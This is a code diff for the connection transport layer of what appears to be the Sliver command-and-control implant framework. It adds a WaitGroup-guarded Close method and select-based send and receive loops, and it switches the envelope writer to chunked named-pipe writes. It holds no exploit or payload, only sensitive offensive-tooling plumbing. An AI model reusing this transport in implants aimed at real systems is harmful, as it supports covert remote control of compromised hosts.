@@ -20,9 +20,7 @@ package transports
 
 import (
 	// {{if .Config.Debug}}
-	"fmt"
 	"log"
-
 	// {{end}}
 
 	"bytes"
@@ -49,12 +47,13 @@ type Connection struct {
 	Recv    chan *pb.Envelope
 	IsOpen  bool
 	Done    chan bool
-	once    *sync.Once
 	tunnels *map[uint64]*Tunnel
 	stream  io.ReadWriteCloser // Might be empty
 
 	// Closing details
-	cleanup func() // User can pass this when instantiating a connection
+	Cleanup func() error    // User can pass this when instantiating a connection
+	wg      *sync.WaitGroup // Ensure cleanup not triggered while envelopes to write.
+	once    *sync.Once      // Ensure cleanup is done only once
 	mutex   *sync.RWMutex
 }
 
@@ -62,22 +61,29 @@ func NewConnection() *Connection {
 	connection := &Connection{
 		Send:    make(chan *pb.Envelope),
 		Recv:    make(chan *pb.Envelope),
+		IsOpen:  true,
 		Done:    make(chan bool, 1),
 		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
-		IsOpen:  true,
+		mutex:   &sync.RWMutex{},
+		wg:      &sync.WaitGroup{},
 	}
 
 	return connection
 }
 
-// Cleanup - Execute default & user-provided cleanups once
-func (c *Connection) Cleanup() {
+// Close - Execute default & user-provided cleanups once
+func (c *Connection) Close() (err error) {
+
+	// Never close anything while there still are
+	// envelopes to be written to the connection.
+	// This is very important for beacons.
+	c.wg.Wait()
+
 	c.once.Do(func() {
 		// This might help components to notice its time
 		// to stop using us, a little ahead of time just in case.
-		// c.Done <- true
+		c.Done <- true
 
 		// Close the envelopes channels
 		// Don't always close Send, because some protocols
@@ -86,15 +92,16 @@ func (c *Connection) Cleanup() {
 
 		// When there is an underlying stream, close
 		if c.stream != nil {
-			c.stream.Close()
+			err = c.stream.Close()
 		}
 		// And perform any actions that the
 		// user might have provided
-		if c.cleanup != nil {
-			c.cleanup()
+		if c.Cleanup != nil {
+			err = c.Cleanup()
 		}
 		c.IsOpen = false
 	})
+	return
 }
 
 // Tunnel - Duplex byte read/write
@@ -134,12 +141,16 @@ func (c *Connection) RemoveTunnel(ID uint64) {
 	delete(*c.tunnels, ID)
 }
 
+// RequestSend - Send an envelope to a channel, to be written to the underlying C2 connection
 func (c *Connection) RequestSend(envelope *pb.Envelope) {
+	c.wg.Add(1) // This envelope should be written to the wire.
 	c.Send <- envelope
 	return
 }
 
+// RequestResend - Retry sending an envelope.
 func (c *Connection) RequestResend(data []byte) {
+	c.wg.Add(1) // This envelope should be written to the wire.
 	c.Send <- &pb.Envelope{
 		Type: pb.MsgTunnelData,
 		Data: data,
@@ -152,42 +163,66 @@ func (c *Connection) RequestRecv() chan *pb.Envelope {
 }
 
 // SetupConnectionStream - Create a primitive ReadWriteCloser on our goroutines (to rule them all)
-func SetupConnectionStream(stream io.ReadWriteCloser, userCleanup func()) (*Connection, error) {
+func SetupConnectionStream(stream io.ReadWriteCloser, userCleanup func() error) (*Connection, error) {
 
-	send := make(chan *pb.Envelope, 100)
-	recv := make(chan *pb.Envelope, 100)
-	ctrl := make(chan bool)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		Done:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
-		IsOpen:  true,
-		cleanup: userCleanup,
-	}
+	// send := make(chan *pb.Envelope, 100)
+	// recv := make(chan *pb.Envelope, 100)
+	// ctrl := make(chan bool)
+	// connection := &Connection{
+	//         Send:    send,
+	//         Recv:    recv,
+	//         Done:    ctrl,
+	//         tunnels: &map[uint64]*Tunnel{},
+	//         mutex:   &sync.RWMutex{},
+	//         once:    &sync.Once{},
+	//         IsOpen:  true,
+	//         cleanup: stream.Close,
+	// }
+	connection := NewConnection()
+	connection.stream = stream
+	connection.Cleanup = userCleanup
 
 	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			streamWriteEnvelope(stream, envelope)
+		defer connection.Close()
+	SEND:
+		for {
+			select {
+			case <-connection.Done:
+				break SEND
+			case envelope := <-connection.Send:
+				// {{if .Config.Debug}}
+				log.Printf("[TLV] send loop envelope type %d\n", envelope.Type)
+				// {{end}}
+				streamWriteEnvelope(stream, envelope)
+
+				// This envelope is either written, or lost.
+				// In any case we are not responsible for it.
+				connection.wg.Done()
+			}
 		}
 	}()
 
 	go func() {
-		defer connection.Cleanup()
+		defer connection.Close()
+	RECV:
 		for {
-			envelope, err := streamReadEnvelope(stream)
-			if err == io.EOF {
-				fmt.Println(err)
-				break
-			}
-			if err == net.ErrClosed {
-				break
-			}
-			if err == nil {
-				recv <- envelope
+			select {
+			case <-connection.Done:
+				break RECV
+			default:
+				envelope, err := streamReadEnvelope(stream)
+				if err == io.EOF {
+					break
+				}
+				if err == net.ErrClosed {
+					break
+				}
+				if err == nil {
+					connection.Recv <- envelope
+					// {{if .Config.Debug}}
+					log.Printf("[TLV] Receive loop envelope type %d\n", envelope.Type)
+					// {{end}}
+				}
 			}
 		}
 	}()
@@ -200,62 +235,62 @@ const (
 	writeBufSizeNamedPipe = 1024
 )
 
-// func streamWriteEnvelope(conn io.ReadWriteCloser, envelope *sliverpb.Envelope) error {
-//         // func writeEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
-//         data, err := proto.Marshal(envelope)
-//         if err != nil {
-//                 // {{if .Config.Debug}}
-//                 log.Print("[namedpipe] Marshaling error: ", err)
-//                 // {{end}}
-//                 return err
-//         }
-//         dataLengthBuf := new(bytes.Buffer)
-//         binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
-//         _, err = conn.Write(dataLengthBuf.Bytes())
-//         if err != nil {
-//                 // {{if .Config.Debug}}
-//                 log.Printf("[namedpipe] Error %s and %d\n", err, dataLengthBuf)
-//                 // {{end}}
-//         }
-//         totalWritten := 0
-//         for totalWritten < len(data)-writeBufSizeNamedPipe {
-//                 n, err2 := conn.Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
-//                 totalWritten += n
-//                 if err2 != nil {
-//                         // {{if .Config.Debug}}
-//                         log.Printf("[namedpipe] Error %s\n", err)
-//                         // {{end}}
-//                 }
-//         }
-//         if totalWritten < len(data) {
-//                 missing := len(data) - totalWritten
-//                 _, err := conn.Write(data[totalWritten : totalWritten+missing])
-//                 if err != nil {
-//                         // {{if .Config.Debug}}
-//                         log.Printf("[namedpipe] Error %s", err)
-//                         // {{end}}
-//                 }
-//         }
-//         return nil
-// }
-
-// streamWriteEnvelope - Writes a message to the TLS socket using length prefix framing
-// which is a fancy way of saying we write the length of the message then the message
-// e.g. [uint32 length|message] so the receiver can delimit messages properly
-func streamWriteEnvelope(stream io.ReadWriteCloser, envelope *pb.Envelope) error {
+func streamWriteEnvelope(conn io.ReadWriteCloser, envelope *sliverpb.Envelope) error {
+	// func writeEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Print("Envelope marshaling error: ", err)
+		log.Print("[namedpipe] Marshaling error: ", err)
 		// {{end}}
 		return err
 	}
 	dataLengthBuf := new(bytes.Buffer)
 	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
-	stream.Write(dataLengthBuf.Bytes())
-	stream.Write(data)
+	_, err = conn.Write(dataLengthBuf.Bytes())
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[namedpipe] Error %s and %d\n", err, dataLengthBuf)
+		// {{end}}
+	}
+	totalWritten := 0
+	for totalWritten < len(data)-writeBufSizeNamedPipe {
+		n, err2 := conn.Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
+		totalWritten += n
+		if err2 != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] Error %s\n", err)
+			// {{end}}
+		}
+	}
+	if totalWritten < len(data) {
+		missing := len(data) - totalWritten
+		_, err := conn.Write(data[totalWritten : totalWritten+missing])
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] Error %s", err)
+			// {{end}}
+		}
+	}
 	return nil
 }
+
+// streamWriteEnvelope - Writes a message to the TLS socket using length prefix framing
+// which is a fancy way of saying we write the length of the message then the message
+// e.g. [uint32 length|message] so the receiver can delimit messages properly
+// func streamWriteEnvelope(stream io.ReadWriteCloser, envelope *pb.Envelope) error {
+//         data, err := proto.Marshal(envelope)
+//         if err != nil {
+//                 // {{if .Config.Debug}}
+//                 log.Print("Envelope marshaling error: ", err)
+//                 // {{end}}
+//                 return err
+//         }
+//         dataLengthBuf := new(bytes.Buffer)
+//         binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
+//         stream.Write(dataLengthBuf.Bytes())
+//         stream.Write(data)
+//         return nil
+// }
 
 func socketWritePing(stream io.ReadWriteCloser) error {
 	// {{if .Config.Debug}}
